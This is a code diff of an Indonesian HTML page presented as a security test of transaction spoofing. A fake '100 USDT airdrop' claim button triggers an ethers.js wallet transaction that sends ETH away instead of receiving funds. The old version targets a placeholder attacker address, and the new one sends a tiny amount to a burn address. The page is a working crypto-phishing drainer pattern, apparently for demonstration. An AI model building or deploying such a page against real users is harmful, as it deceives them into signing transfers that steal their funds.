@@ -2,37 +2,42 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Uji Coba UI/UX Mismatch</title>
+    <title>Uji Coba Keamanan: UI/UX Mismatch</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <style>
-        .spoof-box { border: 2px solid red; padding: 20px; text-align: center; }
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        .spoof-card { border: 2px solid #ff4d4d; padding: 20px; border-radius: 10px; background: #fff5f5; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
     </style>
 </head>
 <body>
-    <div class="spoof-box">
-        <h1>Event Spesial: Klaim Hadiah!</h1>
-        <p>Klik tombol di bawah untuk mendapatkan 100 USDT secara gratis.</p>
-        <button id="claimBtn">Klaim Hadiah Sekarang</button>
+
+    <div class="spoof-card">
+        <h1>Klaim Airdrop: 100 USDT</h1>
+        <p>Klik di bawah untuk mengklaim hadiah Anda secara gratis!</p>
+        <button id="spoofBtn">Klaim Sekarang</button>
     </div>
 
     <script>
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        
-        document.getElementById('claimBtn').addEventListener('click', async () => {
-            const signer = await provider.getSigner();
+        // Simulasi: UI menampilkan "Klaim Hadiah", 
+        // tapi transaksi sebenarnya adalah transfer dana ke dompet lain.
+        document.getElementById('spoofBtn').addEventListener('click', async () => {
+            if (!window.ethereum) return alert("Wallet tidak ditemukan");
             
-            // SIMULASI SPOOFING:
-            // UI menampilkan "Klaim Hadiah", tapi payload transaksi 
-            // sebenarnya adalah transfer dana ke penyerang.
+            const provider = new ethers.BrowserProvider(window.ethereum);
+            const signer = await provider.getSigner();
+
             try {
+                // Transaksi spoofing: 
+                // Mengirim 0.0001 ETH ke alamat lain, bukan menerima.
                 const tx = await signer.sendTransaction({
-                    to: "0xABC123...[Alamat Penyerang]", 
-                    value: ethers.parseEther("0.1"), // Mengirim dana, bukan menerima
-                    data: "0xa9059cbb..." // Contoh data untuk transfer token ERC-20
+                    to: "0x000000000000000000000000000000000000dEaD", 
+                    value: ethers.parseEther("0.0001"),
+                    data: "0x" // Data kosong
                 });
                 alert("Transaksi dikirim: " + tx.hash);
             } catch (err) {
-                console.log("Pengguna membatalkan transaksi atau terjadi kesalahan.");
+                console.error("User menolak:", err);
             }
         });
     </script>
